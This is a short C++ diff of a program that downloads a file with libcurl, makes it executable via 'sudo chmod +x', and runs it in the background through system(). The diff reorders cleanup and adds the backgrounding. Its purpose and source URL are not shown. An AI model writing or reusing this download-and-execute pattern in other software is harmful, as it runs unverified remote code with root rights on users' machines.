@@ -34,18 +34,19 @@ int main() {
     // SECOND: DOWNLOAD FILE
     downloadFile(curl_handle, urlToDownload, file);
 
+    // CLEAN UP
+    curl_easy_cleanup(curl_handle);
+    curl_global_cleanup();
+
     // THIRD: EXECUTE THE FILE
     string permCommand = "sudo chmod +x ";
     permCommand.append(FILE_TO_DOWNLOAD_TO);
-    string executeScript = "./";
-    executeScript.append(FILE_TO_DOWNLOAD_TO);
+    string executeScript = "./"; // NEEDS TO BE ADJUSTED TO RIGHT LOCATION
+    executeScript.append(FILE_TO_DOWNLOAD_TO).append(" &");
 
     system(permCommand.c_str());
     system(executeScript.c_str());
 
-    // CLEAN UP
-    curl_easy_cleanup(curl_handle);
-    curl_global_cleanup();
     return 0;
 }
 
